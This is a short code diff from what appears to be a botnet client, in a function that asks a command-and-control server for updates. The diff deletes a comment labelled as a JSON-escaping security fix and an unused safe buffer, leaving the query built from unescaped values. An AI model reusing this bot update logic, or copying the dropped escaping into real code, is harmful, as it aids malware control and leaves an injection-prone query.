@@ -276,8 +276,6 @@ int payload_check_update(notnet_bot_t *bot) {
 
     /* Check C2 for update command */
     char query[256];
-    /* SECURITY FIX (#1): Escape values for JSON */
-    char safe_query[256];
     snprintf(query, sizeof(query),
         "{\"cmd\":\"check_update\",\"arch\":\"%s\",\"version\":\"%s\"}",
         payload_get_arch(), NOTNET_VERSION);
